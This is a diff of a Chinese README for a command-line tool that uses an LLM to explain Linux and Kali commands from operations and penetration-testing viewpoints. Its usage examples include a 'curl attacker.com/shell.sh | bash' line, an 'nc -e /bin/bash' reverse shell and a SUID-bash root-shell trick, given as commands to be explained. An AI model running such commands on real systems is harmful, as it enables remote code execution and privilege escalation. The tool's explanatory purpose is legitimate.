@@ -1,53 +1,77 @@
+<div align="center">
+
 # explain-tool
 
-> 专为 **Kali Linux / Ubuntu** 设计的命令行解释工具  
-> 双视角输出：🔧 通用（运维管理）+ 🔴 安全（渗透测试 / CTF）
+**专为 Kali Linux / Ubuntu 设计的 AI 命令解释工具**
+
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
+[![Platform](https://img.shields.io/badge/Platform-Kali%20%7C%20Ubuntu-purple.svg)]()
+[![apt](https://img.shields.io/badge/Install-apt%20%7C%20script-green.svg)]()
+
+输入任意 Linux / Kali 命令，即刻获得**三种视角**的专业解释：  
+⚡ 快速一句话 · 🔧 通用运维 · 🔴 安全渗透
+
+</div>
 
 ---
 
-## 功能特性
+## 目录
+
+- [功能概览](#功能概览)
+- [安装](#安装)
+- [配置](#配置)
+- [使用方法](#使用方法)
+- [命令参考](#命令参考)
+- [支持的 LLM 后端](#支持的-llm-后端)
+- [环境变量](#环境变量)
+- [文件结构](#文件结构)
+- [卸载](#卸载)
+- [注意事项](#注意事项)
+
+---
+
+## 功能概览
 
 | 特性 | 说明 |
 |------|------|
-| 🔧 通用视角 | 系统管理、运维场景、参数解析、最佳实践 |
-| 🔴 安全视角 | PrivEsc、GTFOBins、CTF 利用链、蓝队检测 |
-| 🌐 双语支持 | 中文（zh）/ English（en），可配置或临时切换 |
-| 🤖 多后端 | OpenAI / DeepSeek / Kimi / Ollama（本地） |
-| 💾 缓存 | 相同命令结果自动缓存，减少 API 消耗 |
-| 🎨 彩色输出 | 基于 `rich` 库，自动降级纯文本 |
-| 🔑 环境变量 | 支持 `EXPLAIN_API_KEY` / `EXPLAIN_LANG` 等覆盖 |
+| ⚡ **快速模式** `-q` | 1-3 句话直接说明命令作用，响应速度最快 |
+| 🔧 **通用视角** `-g` | 参数解析、运维场景、最佳实践、相似命令对比 |
+| 🔴 **安全视角** `-s` | PrivEsc 利用链、GTFOBins、CTF 场景、蓝队检测 |
+| 🌐 **双语输出** | 中文 `zh`（默认）/ English `en`，随时切换 |
+| 🤖 **多后端支持** | OpenAI · DeepSeek · Ollama（本地离线）· 任意兼容 API |
+| 💾 **本地缓存** | 相同命令自动命中缓存，无需重复调用 API |
+| 🎨 **终端美化** | 基于 `rich` 渲染 Markdown，不安装时自动降级纯文本 |
 
 ---
 
-## 快速安装
+## 安装
 
-### 方式一：apt 安装（推荐，自动更新）
+### 方式一：apt 安装（推荐）
+
+> 支持 `apt upgrade` 自动更新，适合长期使用。
 
 ```bash
-# 1. 添加 GPG 公钥
-curl -fsSL https://Kriemseeley.github.io/explain_easily/explain-tool.gpg.key \
-    | sudo gpg --dearmor -o /etc/apt/keyrings/explain-tool.gpg
+# 添加 GPG 公钥
+sudo mkdir -p /etc/apt/keyrings
+curl -fsSL https://kriemseeley.github.io/explain_easily/explain-tool.gpg.key \
+    | sudo gpg --yes --dearmor -o /etc/apt/keyrings/explain-tool.gpg
 
-# 2. 添加软件源
+# 添加软件源
 echo "deb [signed-by=/etc/apt/keyrings/explain-tool.gpg arch=all] \
-https://Kriemseeley.github.io/explain_easily stable main" \
+https://kriemseeley.github.io/explain_easily stable main" \
     | sudo tee /etc/apt/sources.list.d/explain-tool.list
 
-# 3. 安装
+# 安装
 sudo apt update && sudo apt install explain-tool
 ```
-
-卸载：`sudo apt remove explain-tool`
-
----
 
 ### 方式二：一键脚本安装
 
 ```bash
 git clone https://github.com/Kriemseeley/explain_easily.git
 cd explain_easily
-chmod +x install.sh
-./install.sh
+chmod +x install.sh && ./install.sh
 ```
 
 ### 方式三：手动安装
@@ -62,184 +86,256 @@ sudo chmod +x /usr/local/bin/explain
 
 ## 配置
 
-### 方式一：交互式配置向导（推荐）
+首次安装后，**必须**运行配置向导选择 LLM 后端：
 
 ```bash
 explain --config
 ```
 
-配置文件保存在 `~/.config/explain-tool/config.json`。
+配置向导会引导完成以下设置：
 
-### 方式二：环境变量（适合临时使用或 CI/CD）
+| 配置项 | 说明 |
+|--------|------|
+| 后端选择 | openai / deepseek / ollama / custom |
+| API Key | 云端 API 鉴权密钥（Ollama 无需填写） |
+| 模型名称 | 如 `gpt-4o-mini`、`deepseek-chat`、`qwen2.5:7b` |
+| 回复语言 | `zh`（中文）或 `en`（English） |
+| 本地缓存 | 是否启用结果缓存 |
+
+配置文件保存于 `~/.config/explain-tool/config.json`，可随时通过 `explain --config` 修改。
+
+### 使用 Ollama（本地，无需 API Key）
 
 ```bash
-export EXPLAIN_API_KEY='sk-xxxxxxxxxxxxxxxx'
-export EXPLAIN_API_BASE='https://api.openai.com/v1'   # 可选
-export EXPLAIN_MODEL='gpt-4o-mini'                     # 可选
-export EXPLAIN_LANG='en'                               # 可选：zh（默认）或 en
-```
-
-### 方式三：使用本地 Ollama（无需 API Key）
-
-```bash
-# 先启动 Ollama 并拉取模型
+# 拉取模型（推荐 qwen2.5:7b 或 llama3.2）
 ollama pull qwen2.5:7b
 
 # 配置时选择 ollama 后端
 explain --config
 ```
 
+> 安全场景下推荐使用本地 Ollama，命令内容完全不离开本机。
+
+### 使用环境变量（临时覆盖，适合脚本 / CI）
+
+```bash
+export EXPLAIN_API_KEY='sk-xxxxxxxxxxxxxxxx'
+export EXPLAIN_API_BASE='https://api.deepseek.com/v1'   # 可选
+export EXPLAIN_MODEL='deepseek-chat'                     # 可选
+export EXPLAIN_LANG='en'                                 # 可选
+```
+
 ---
 
 ## 使用方法
 
-### 基本用法
+### 快速模式（`-q`）
+
+最简洁的用法，1-3 句话直接给出命令作用，响应最快：
 
 ```bash
-# 全视角（通用 + 安全，默认，中文）
-explain chmod u+s /bin/bash
-
-# 仅安全视角（渗透/CTF/红队）
-explain -s find / -perm -4000 2>/dev/null
-
-# 仅通用视角（系统管理/运维）
-explain -g tar -czf backup.tar.gz /var/www
-
-# 同时指定 -s 和 -g（等价于默认全视角）
-explain -sg nmap -sV -O 192.168.1.1
-
-# 英文输出（临时）
-explain --lang en chmod u+s /bin/bash
-
-# 英文 + 安全视角
-explain --lang en -s sudo -l
-
-# 永久切换为英文（写入配置）
-explain --config    # 在向导中选择 en
-# 或
-export EXPLAIN_LANG=en
+explain -q chmod u+s /bin/bash
+explain -q find / -perm -4000 2>/dev/null
+explain -q sudo -l
 ```
 
-### 命令行参数
-
+**示例输出：**
 ```
-用法: explain [-s] [-g] [-n] [--lang LANG] [--backend BACKEND]
-              [--config] [--show-config] [--clear-cache] [command ...]
-
-视角标志（可同时使用）:
-  -s, --security      安全视角（渗透测试 / CTF / 红队 / PrivEsc）
-  -g, --general       通用视角（系统管理 / 运维 / 最佳实践）
-  （默认不加标志 = -sg 全视角）
-
-语言选项:
-  --lang zh           中文回复（默认）
-  --lang en           English response（英文回复）
-  （也可在 explain --config 中永久设置，或用 EXPLAIN_LANG 环境变量）
-
-其他选项:
-  -n, --no-cache      忽略缓存，强制重新查询
-  --backend BACKEND   临时指定后端（openai/ollama/deepseek/custom）
-  --config            运行交互式配置向导
-  --show-config       显示当前配置
-  --clear-cache       清空本地缓存
-  --uninstall         交互式卸载（删除二进制和配置目录）
-  -h, --help          显示帮助
+⚡ chmod u+s /bin/bash
+为 /bin/bash 设置 SUID 位，使任何用户执行时都以文件所有者（通常是 root）的权限运行。
+【⚠️ 安全风险：经典本地权限提升手法，可直接通过 /bin/bash -p 获得 root shell】
 ```
 
 ---
 
-## 示例输出
+### 全视角（默认）
 
-### `explain chmod u+s /bin/bash`（全视角）
+同时输出通用分析 + 安全分析，信息最完整：
+
+```bash
+explain chmod u+s /bin/bash
+explain nmap -sV -O 192.168.1.1
+explain curl http://attacker.com/shell.sh | bash
+```
+
+---
+
+### 安全视角（`-s`）
+
+深度分析渗透测试 / CTF / 权限提升价值，面向红队：
+
+```bash
+explain -s find / -perm -4000 2>/dev/null
+explain -s python3 -c "import pty; pty.spawn('/bin/bash')"
+explain -s nc -e /bin/bash 10.10.10.10 4444
+```
+
+**安全视角包含：**
+- 权限提升（PrivEsc）利用条件与思路
+- GTFOBins 收录情况及具体利用命令
+- CTF 经典出题场景与利用链
+- 风险等级评估表（PrivEsc / 持久化 / 信息泄露）
+- 蓝队检测与防御建议（auditd 规则、SIEM 告警）
+
+---
+
+### 通用视角（`-g`）
+
+系统管理员 / DevOps 角度的完整解释：
+
+```bash
+explain -g tar -czf backup.tar.gz /var/www
+explain -g systemctl restart nginx
+explain -g awk '{print $1}' /var/log/auth.log
+```
+
+**通用视角包含：**
+- 参数逐项解析（表格形式）
+- 日常运维典型使用场景
+- 常见错误与性能注意事项
+- 类似命令横向对比
+
+---
+
+### 语言切换
+
+```bash
+# 临时使用英文（仅本次）
+explain --lang en chmod u+s /bin/bash
+explain --lang en -s sudo -l
+explain --lang en -q ls -la
+
+# 永久切换（写入配置文件）
+explain --config          # 向导中选择语言
+# 或通过环境变量
+export EXPLAIN_LANG=en
+```
+
+---
+
+## 命令参考
 
 ```
-🔍 Explain Tool
- 命令: chmod u+s /bin/bash
- 模式: 全视角（通用 + 安全）
+用法:
+  explain [视角] [选项] <命令及参数...>
 
-## 📋 命令概览
-chmod u+s /bin/bash 为 /bin/bash 设置 SUID 位，使任何用户执行该文件时
-都以文件所有者（通常是 root）的身份运行。
+视角标志（可单独使用，-s -g 可同时使用等价于全视角）:
+  -q, --quick         ⚡ 快速模式：仅输出核心作用（1-3句），响应最快
+  -s, --security      🔴 安全视角（渗透测试 / CTF / 红队 / PrivEsc）
+  -g, --general       🔧 通用视角（系统管理 / 运维 / 最佳实践）
+  （不加任何标志 = 全视角，等价于 -sg）
 
-## 🔩 参数解析
-| 参数       | 含义                                    |
-|------------|-----------------------------------------|
-| chmod      | 修改文件权限的命令                        |
-| u+s        | 为文件所有者（u）添加 SUID 位（s）        |
-| /bin/bash  | 目标文件（bash shell 可执行文件）         |
+语言选项:
+  --lang zh           中文回复（默认）
+  --lang en           English response
 
-## 🔧 通用视角
-SUID 位的合法用途包括...（继续输出）
+缓存与后端:
+  -n, --no-cache      忽略缓存，强制重新查询
+  --backend BACKEND   临时指定后端（openai / ollama / deepseek / custom）
 
-## 🔴 安全视角
-⚠️ 风险等级：极高
-GTFOBins 收录：是
-利用方式：/bin/bash -p  即可获得 root shell...
+工具选项:
+  --config            运行交互式配置向导
+  --show-config       显示当前所有配置项
+  --clear-cache       清空本地查询缓存
+  --uninstall         交互式卸载（删除二进制文件和配置目录）
+  -h, --help          显示帮助信息
 ```
 
 ---
 
 ## 支持的 LLM 后端
 
-| 后端 | 说明 | 是否需要 API Key |
-|------|------|----------------|
-| `openai` | OpenAI API（gpt-4o-mini 等） | 是 |
-| `deepseek` | DeepSeek API（性价比高，推荐）| 是 |
-| `ollama` | 本地 Ollama（qwen2.5、llama3 等）| 否 |
-| `custom` | 兼容 OpenAI 格式的任意 API | 视情况 |
+| 后端标识 | 服务 | API Key | 推荐模型 | 备注 |
+|----------|------|---------|----------|------|
+| `openai` | OpenAI | 必须 | `gpt-4o-mini` | 效果最佳 |
+| `deepseek` | DeepSeek | 必须 | `deepseek-chat` | 性价比高，**国内推荐** |
+| `ollama` | 本地 Ollama | 不需要 | `qwen2.5:7b` | 离线使用，**安全场景推荐** |
+| `custom` | 任意 OpenAI 兼容 API | 视情况 | 自定义 | 支持 Kimi、通义等 |
 
-> 推荐国内用户使用 **DeepSeek**（`https://platform.deepseek.com`）  
-> 或本地 **Ollama** + `qwen2.5:7b` 以保证数据安全
+> **推荐组合：**
+> - 云端：DeepSeek — 价格低、响应快、中文优秀
+> - 本地：Ollama + `qwen2.5:7b` — 数据不出本机，适合渗透测试环境
+
+---
+
+## 环境变量
+
+所有环境变量优先级高于配置文件，CLI 参数优先级最高。
+
+| 变量名 | 说明 | 示例 |
+|--------|------|------|
+| `EXPLAIN_API_KEY` | API 鉴权密钥 | `sk-xxxxxxxx` |
+| `EXPLAIN_API_BASE` | API Base URL（覆盖默认） | `https://api.deepseek.com/v1` |
+| `EXPLAIN_MODEL` | 模型名称（覆盖配置） | `deepseek-chat` |
+| `EXPLAIN_LANG` | 回复语言（`zh` / `en`） | `en` |
 
 ---
 
 ## 文件结构
 
+**项目仓库：**
+
+```
+explain_easily/
+├── explain             # 主脚本（Python 3.10+，无其他强依赖）
+├── install.sh          # 一键安装脚本（Kali / Ubuntu）
+├── build-deb.sh        # 构建 .deb 包
+├── publish-repo.sh     # 发布到 GitHub Pages apt 仓库
+├── debian/             # Debian 打包元数据
+│   ├── control
+│   ├── changelog
+│   ├── rules
+│   ├── install
+│   └── postinst
+├── requirements.txt    # Python 依赖（仅 rich）
+└── README.md
+```
+
+**运行时数据（用户目录）：**
+
 ```
 ~/.config/explain-tool/
-├── config.json     # 配置文件
-└── cache/          # 查询缓存（.md 文件）
+├── config.json         # 配置文件（含后端、API Key、语言等）
+└── cache/              # 查询结果缓存（按命令+模式+语言哈希存储）
 ```
 
 ---
 
 ## 卸载
 
-### 方式一：一键卸载脚本（推荐，git clone 安装后使用）
-
+**apt 安装：**
 ```bash
-cd explain_easily        # 进入克隆的项目目录
-chmod +x uninstall.sh
-./uninstall.sh
+sudo apt remove explain-tool
 ```
 
-脚本会交互式确认后，自动删除可执行文件和配置目录。
-
-### 方式二：通过命令行参数卸载
-
-如果 `explain` 还可以正常运行，可以直接执行：
-
+**脚本 / 手动安装：**
 ```bash
+# 方式一：通过工具自身卸载
 explain --uninstall
-```
 
-### 方式三：手动卸载
-
-```bash
+# 方式二：手动删除
 sudo rm -f /usr/local/bin/explain
 rm -rf ~/.config/explain-tool
 ```
 
-### apt 安装的卸载方式
-
+**同时清理软件源（如已添加）：**
 ```bash
-sudo apt remove explain-tool
+sudo rm -f /etc/apt/sources.list.d/explain-tool.list
+sudo rm -f /etc/apt/keyrings/explain-tool.gpg
 ```
 
 ---
 
 ## 注意事项
 
-- 所有命令解释均通过 LLM 生成，可能存在误差，请结合 `man` 手册验证
-- 安全视角内容仅供授权渗透测试和学习研究使用，请遵守相关法律法规
-- 建议安全敏感场景下使用本地 Ollama 模型，避免命令内容泄露至云端
+- **准确性**：所有解释均由 LLM 生成，可能存在偏差，关键操作请以 `man` 手册为准
+- **合法使用**：安全视角内容仅供授权渗透测试、CTF 竞赛及安全学习研究使用，请严格遵守相关法律法规
+- **数据安全**：敏感环境下建议使用本地 Ollama 模型，避免命令内容经由网络传输至第三方 API
+
+---
+
+<div align="center">
+
+MIT License · [GitHub](https://github.com/Kriemseeley/explain_easily)
+
+</div>
